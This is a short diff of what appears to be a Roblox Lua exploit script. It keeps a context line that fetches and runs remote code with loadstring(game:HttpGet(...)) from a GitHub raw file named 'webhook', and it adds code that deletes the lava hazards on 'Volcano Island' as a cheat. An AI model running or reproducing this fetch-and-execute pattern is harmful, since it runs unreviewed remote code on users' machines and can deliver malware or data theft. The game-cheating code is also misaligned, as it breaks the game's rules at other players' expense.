@@ -426,4 +426,10 @@ followLoopFrom(workspace.Islands["Jungle Island"])
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
 
-print("Hordldkkdk!")
+
+local lavaParts = workspace.Islands["Volcano Island"]:WaitForChild("LavaParts")
+
+if lavaParts then
+	wait(1)
+lavaParts:Destroy()
+end
